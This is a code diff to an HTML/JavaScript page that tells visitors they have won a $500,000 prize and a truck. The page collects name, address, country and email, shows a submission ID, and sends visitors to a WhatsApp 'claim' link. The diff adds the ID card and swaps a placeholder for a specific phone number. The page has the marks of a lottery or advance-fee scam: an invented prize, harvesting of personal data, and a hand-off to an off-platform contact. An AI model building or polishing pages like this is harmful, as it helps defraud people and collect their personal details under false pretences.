@@ -158,102 +158,15 @@
             box-shadow: 0 8px 30px rgba(37, 211, 102, 0.35);
         }
 
-        .btn-group {
-            display: flex;
-            gap: 12px;
-            margin-top: 8px;
-        }
-
-        .btn-group .btn {
-            flex: 1;
-        }
-
-        .success-box {
-            display: none;
-            text-align: center;
-            padding: 20px 0 10px;
-        }
-
-        .success-box.show {
-            display: block;
-            animation: fadeUp 0.6s ease;
-        }
-
-        @keyframes fadeUp {
-            0% {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            100% {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        .success-box .trophy {
-            font-size: 60px;
-            color: #f59e0b;
-            margin-bottom: 12px;
-            display: block;
-        }
-
-        .success-box h2 {
-            font-size: 28px;
-            font-weight: 700;
-            background: linear-gradient(135deg, #fbbf24, #f59e0b);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin-bottom: 8px;
-        }
-
-        .success-box .sub-text {
-            font-size: 18px;
-            font-weight: 500;
-            color: rgba(255, 255, 255, 0.85);
-            margin-bottom: 16px;
-        }
-
-        .success-box .prize-amount {
-            font-size: 32px;
-            font-weight: 700;
-            color: #fbbf24;
-            margin: 8px 0;
-        }
-
-        .success-box .prize-truck {
-            font-size: 20px;
-            font-weight: 600;
-            color: rgba(255, 255, 255, 0.9);
-            margin-bottom: 20px;
-        }
-
-        .success-box .prize-truck i {
-            color: #7c3aed;
-            margin-right: 8px;
-        }
-
-        .success-box .claim-link {
-            display: inline-block;
-            padding: 16px 40px;
-            background: #25D366;
+        .btn-success {
+            background: #10b981;
             color: #fff;
-            border-radius: 16px;
-            font-weight: 700;
-            font-size: 18px;
-            text-decoration: none;
-            transition: all 0.25s;
-            margin-top: 8px;
         }
 
-        .success-box .claim-link:hover {
-            background: #1ebe5c;
-            transform: scale(1.02);
-            box-shadow: 0 8px 30px rgba(37, 211, 102, 0.35);
-        }
-
-        .success-box .claim-link i {
-            margin-right: 10px;
+        .btn-success:hover {
+            background: #059669;
+            transform: translateY(-1px);
+            box-shadow: 0 8px 30px rgba(16, 185, 129, 0.35);
         }
 
         .divider {
@@ -311,6 +224,133 @@
             }
         }
 
+        /* ─── SUCCESS BOX ─── */
+        .success-box {
+            display: none;
+            text-align: center;
+            padding: 20px 0 10px;
+        }
+
+        .success-box.show {
+            display: block;
+            animation: fadeUp 0.6s ease;
+        }
+
+        @keyframes fadeUp {
+            0% {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .success-box .trophy {
+            font-size: 60px;
+            color: #f59e0b;
+            margin-bottom: 12px;
+            display: block;
+        }
+
+        .success-box h2 {
+            font-size: 28px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fbbf24, #f59e0b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 8px;
+        }
+
+        .success-box .sub-text {
+            font-size: 18px;
+            font-weight: 500;
+            color: rgba(255, 255, 255, 0.85);
+            margin-bottom: 16px;
+        }
+
+        .success-box .prize-amount {
+            font-size: 32px;
+            font-weight: 700;
+            color: #fbbf24;
+            margin: 8px 0;
+        }
+
+        .success-box .prize-truck {
+            font-size: 20px;
+            font-weight: 600;
+            color: rgba(255, 255, 255, 0.9);
+            margin-bottom: 16px;
+        }
+
+        .success-box .prize-truck i {
+            color: #7c3aed;
+            margin-right: 8px;
+        }
+
+        /* ID display card */
+        .id-display-card {
+            background: rgba(124, 58, 237, 0.12);
+            border: 1.5px dashed rgba(124, 58, 237, 0.40);
+            border-radius: 16px;
+            padding: 16px 20px;
+            margin: 18px 0 22px;
+        }
+
+        .id-display-card .label {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.4);
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+            font-weight: 600;
+        }
+
+        .id-display-card .id-value {
+            font-size: 28px;
+            font-weight: 700;
+            color: #a78bfa;
+            letter-spacing: 1px;
+            margin: 4px 0 6px;
+            word-break: break-all;
+        }
+
+        .id-display-card .hint {
+            font-size: 13px;
+            color: rgba(255, 255, 255, 0.35);
+            line-height: 1.4;
+        }
+
+        .id-display-card .hint i {
+            color: #fbbf24;
+            margin-right: 6px;
+        }
+
+        .success-box .claim-link {
+            display: inline-block;
+            padding: 16px 40px;
+            background: #25D366;
+            color: #fff;
+            border-radius: 16px;
+            font-weight: 700;
+            font-size: 18px;
+            text-decoration: none;
+            transition: all 0.25s;
+            margin-top: 4px;
+        }
+
+        .success-box .claim-link:hover {
+            background: #1ebe5c;
+            transform: scale(1.02);
+            box-shadow: 0 8px 30px rgba(37, 211, 102, 0.35);
+        }
+
+        .success-box .claim-link i {
+            margin-right: 10px;
+        }
+
+        /* ─── MODAL ─── */
         .modal-overlay {
             display: none;
             position: fixed;
@@ -421,10 +461,6 @@
                 gap: 0;
             }
 
-            .btn-group {
-                flex-direction: column;
-            }
-
             .success-box h2 {
                 font-size: 22px;
             }
@@ -440,13 +476,18 @@
             .modal-box .modal-actions {
                 flex-direction: column;
             }
+
+            .id-display-card .id-value {
+                font-size: 22px;
+            }
         }
     </style>
 </head>
 <body>
 
     <div class="card" id="app">
-        <!-- header -->
+
+        <!-- HEADER -->
         <div class="card-header">
             <i class="fas fa-pen-to-square"></i>
             <h1>Submit Your Entry</h1>
@@ -496,9 +537,20 @@
             <div class="prize-truck">
                 <i class="fas fa-truck"></i> + A NEW BRAND TRUCK
             </div>
-            <p style="color: rgba(255,255,255,0.5); font-size: 14px; margin: 12px 0 18px;">
+            <p style="color: rgba(255,255,255,0.4); font-size: 14px; margin: 0 0 6px;">
                 (Five Hundred Thousand Dollars)
             </p>
+
+            <!-- ⭐ ID DISPLAY with INSTRUCTIONS -->
+            <div class="id-display-card">
+                <div class="label"><i class="fas fa-fingerprint"></i> Your Submission ID</div>
+                <div class="id-value" id="submissionIdDisplay">—</div>
+                <div class="hint">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <strong>IMPORTANT:</strong> Please note this ID carefully. You will need it to check your approval status later.
+                </div>
+            </div>
+
             <a href="#" class="claim-link" id="whatsappLink">
                 <i class="fab fa-whatsapp"></i> Click here to instantly claim
             </a>
@@ -512,7 +564,7 @@
                 <i class="fas fa-eye"></i> View Submission
             </button>
             <p style="color: rgba(255,255,255,0.25); font-size: 13px; text-align: center; margin-top: 12px;">
-                Already submitted? Enter your ID to check your details.
+                Already submitted? Enter your ID to check your details and approval status.
             </p>
         </div>
     </div>
@@ -521,7 +573,7 @@
     <div class="modal-overlay" id="idModal">
         <div class="modal-box">
             <h3><i class="fas fa-search" style="color: #7c3aed; margin-right: 8px;"></i> View Submission</h3>
-            <p>Enter the submission ID to view your details.</p>
+            <p>Enter the Submission ID you received after submitting.</p>
             <input type="text" id="modalIdInput" placeholder="e.g. 12345" autofocus />
             <div class="modal-actions">
                 <button class="btn btn-cancel" id="modalCancelBtn">Cancel</button>
@@ -539,6 +591,7 @@
             const submitBtn = document.getElementById('submitBtn');
             const formStatus = document.getElementById('formStatus');
             const successBox = document.getElementById('successBox');
+            const submissionIdDisplay = document.getElementById('submissionIdDisplay');
             const viewBtn = document.getElementById('viewBtn');
             const modal = document.getElementById('idModal');
             const modalIdInput = document.getElementById('modalIdInput');
@@ -557,16 +610,10 @@
                 formStatus.className = 'form-status';
             }
 
-            function showSuccess() {
+            function showSuccess(submissionId) {
                 form.style.display = 'none';
+                submissionIdDisplay.textContent = submissionId || 'N/A';
                 successBox.classList.add('show');
-            }
-
-            function resetForm() {
-                form.reset();
-                clearStatus();
-                submitBtn.disabled = false;
-                submitBtn.innerHTML = '<i class="fas fa-paper-plane"></i> Submit Entry';
             }
 
             // ─── form submission ───
@@ -574,33 +621,24 @@
                 e.preventDefault();
                 clearStatus();
 
-                // gather data
                 const fullName = document.getElementById('fullName').value.trim();
                 const address = document.getElementById('address').value.trim();
                 const country = document.getElementById('country').value.trim();
                 const countyCode = document.getElementById('countyCode').value.trim();
                 const email = document.getElementById('email').value.trim();
 
-                // basic validation
+                // validation
                 if (!fullName || !address || !country || !countyCode || !email) {
                     setStatus('Please fill in all required fields.', 'error');
                     return;
                 }
 
-                // email format
                 if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
                     setStatus('Please enter a valid email address.', 'error');
                     return;
                 }
 
-                // prepare JSON payload (no image)
-                const payload = {
-                    fullName,
-                    address,
-                    country,
-                    countyCode,
-                    email
-                };
+                const payload = { fullName, address, country, countyCode, email };
 
                 submitBtn.disabled = true;
                 submitBtn.innerHTML = '<span class="loading-spinner"></span> Submitting…';
@@ -608,9 +646,7 @@
                 try {
                     const response = await fetch('/api/submit', {
                         method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json',
-                        },
+                        headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify(payload),
                     });
 
@@ -620,15 +656,16 @@
                     }
 
                     const data = await response.json();
+                    const submissionId = data.id || 'TEMP-' + Math.floor(100000 + Math.random() * 900000);
 
-                    // update WhatsApp link with a custom message
-                    const phone = '1234567890'; // replace with actual number
+                    // Update WhatsApp link with the ID and the NEW number: +1 562-672-1839
+                    const phone = '15626721839'; // ✅ updated
                     const msg = encodeURIComponent(
-                        `I just claimed my $500,000 prize! 🎉\nSubmission ID: ${data.id || 'N/A'}`
+                        `I just claimed my $500,000 prize! 🎉\nSubmission ID: ${submissionId}`
                     );
                     whatsappLink.href = `https://wa.me/${phone}?text=${msg}`;
 
-                    showSuccess();
+                    showSuccess(submissionId);
                     setStatus('✅ Form submitted successfully!', 'success');
 
                 } catch (err) {
@@ -664,23 +701,16 @@
                     setTimeout(() => { modalIdInput.style.borderColor = ''; }, 800);
                     return;
                 }
-                // navigate to view.html with id
                 window.location.href = `view.html?id=${encodeURIComponent(id)}`;
             });
 
             modalIdInput.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') {
-                    modalGoBtn.click();
-                }
-                if (e.key === 'Escape') {
-                    closeModal();
-                }
+                if (e.key === 'Enter') modalGoBtn.click();
+                if (e.key === 'Escape') closeModal();
             });
 
             document.addEventListener('keydown', function(e) {
-                if (e.key === 'Escape' && modal.classList.contains('show')) {
-                    closeModal();
-                }
+                if (e.key === 'Escape' && modal.classList.contains('show')) closeModal();
             });
 
         })();
